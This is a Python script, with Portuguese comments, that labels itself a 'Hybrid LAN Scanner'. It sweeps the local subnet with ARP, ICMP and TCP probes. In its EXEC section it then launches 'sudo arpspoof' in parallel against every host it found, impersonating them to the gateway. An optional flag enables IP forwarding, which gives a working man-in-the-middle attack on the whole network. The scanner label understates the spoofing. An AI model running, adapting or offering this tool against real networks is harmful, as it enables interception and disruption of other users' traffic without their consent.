import argparse
import subprocess
import atexit
from scapy.all import ARP, Ether, srp, sr, conf, IP, TCP
import ipaddress
import netifaces
from concurrent.futures import ThreadPoolExecutor


# ---------------- NETWORK ----------------

def is_private_ip(ip):
    octets = ip.split(".")
    if len(octets) != 4:
        return False
    o1, o2, *_ = map(int, octets)
    return (o1 == 10) or (o1 == 172 and 16 <= o2 <= 31) or (o1 == 192 and o2 == 168)


def get_network_info():
    for iface in netifaces.interfaces():
        addrs = netifaces.ifaddresses(iface)
        if netifaces.AF_INET in addrs:
            ip = addrs[netifaces.AF_INET][0].get("addr")
            if ip and is_private_ip(ip):
                gateways = netifaces.gateways()
                gw_ip = None
                if netifaces.AF_INET in gateways and gateways[netifaces.AF_INET]:
                    for g in gateways[netifaces.AF_INET]:
                        if g[1] == iface:
                            gw_ip = g[0]
                            break
                return gw_ip, iface, ip
    return None, None, None


def get_network(ip):
    return ipaddress.ip_network(ip + '/24', strict=False)


# ---------------- SCANS ----------------

def scan_arp(interface, network, exclude_ip=None):
    print("[+] ARP scan...")

    arp = ARP(pdst=str(network))
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    ans, _ = srp(packet, timeout=2, inter=0.05, iface=interface, verbose=0)

    hosts = [r.psrc for _, r in ans if r.psrc != exclude_ip]

    return hosts


def scan_icmp_fallback(network):
    print("[+] ICMP fallback scan...")

    alive = []
    for ip in network.hosts():
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "1", str(ip)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if result.returncode == 0:
            alive.append(str(ip))

    return alive


def scan_tcp_targets(hosts):
    if not hosts:
        return []

    print("[+] TCP targeted scan...")

    pkt = IP(dst=hosts) / TCP(dport=80, flags="S")

    ans, _ = sr(pkt, timeout=2, verbose=0)

    alive = []
    for _, r in ans:
        if r.haslayer(TCP):
            alive.append(r.src)

    return alive


def hybrid_scan(interface, network, exclude_ip=None):
    # 1. ARP primeiro (resolve MAC corretamente)
    arp_hosts = scan_arp(interface, network, exclude_ip)

    # 2. fallback se necessário
    if not arp_hosts:
        print("[!] Nenhum host via ARP, usando fallback ICMP...")
        arp_hosts = scan_icmp_fallback(network)

    # 3. TCP apenas nos hosts encontrados
    tcp_hosts = scan_tcp_targets(arp_hosts)

    # 4. merge
    all_hosts = set(arp_hosts + tcp_hosts)

    if exclude_ip:
        all_hosts.discard(exclude_ip)

    hosts = sorted(list(all_hosts))

    # 5. salvar arquivo
    with open("ip.txt", "w") as f:
        for ip in hosts:
            f.write(ip + "\n")

    print(f"[+] {len(hosts)} hosts encontrados (HYBRID STABLE)")

    return hosts


# ---------------- EXEC ----------------

def execute_system_command(interface, ip, gateway):
    print(f"[+] Executando: arpspoof em {ip}")
    subprocess.run(
        ["sudo", "arpspoof", "-i", interface, "-t", gateway, ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )


# ---------------- PACKET FORWARDING ----------------

def get_ip_forward_status():
    with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
        return f.read().strip()


def set_ip_forward(value):
    subprocess.run(["sudo", "sh", "-c", f"echo {value} > /proc/sys/net/ipv4/ip_forward"])


def handle_packet_forwarding(enable):
    original = get_ip_forward_status()

    if enable:
        if original == "0":
            print("[+] Ativando packet forwarding")
            set_ip_forward(1)

        def restore():
            print(f"[+] Restaurando packet forwarding para {original}")
            set_ip_forward(int(original))

        atexit.register(restore)
    else:
        print("[+] Packet forwarding não ativado")


# ---------------- MAIN ----------------

def main():
    parser = argparse.ArgumentParser(description="Hybrid LAN Scanner (Fast & Stable)")
    parser.add_argument("--packet_forwarding", action="store_true")
    args = parser.parse_args()

    handle_packet_forwarding(args.packet_forwarding)

    conf.verb = 0  # silencia warnings do scapy

    gateway, iface, local_ip = get_network_info()
    if not iface:
        print("[-] Interface LAN não encontrada")
        return

    print(f"[+] Interface: {iface}")
    print(f"[+] IP local: {local_ip}")
    print(f"[+] Gateway: {gateway}")

    network = get_network(local_ip)

    hosts = hybrid_scan(iface, network, exclude_ip=gateway)

    print("[+] Hosts encontrados:")
    for ip in hosts:
        print(f" - {ip}")

    # execução paralela
    with ThreadPoolExecutor(max_workers=100) as executor:
        for ip in hosts:
            executor.submit(execute_system_command, iface, ip, gateway)

    print("[+] Execução paralela iniciada")


if __name__ == "__main__":
    main()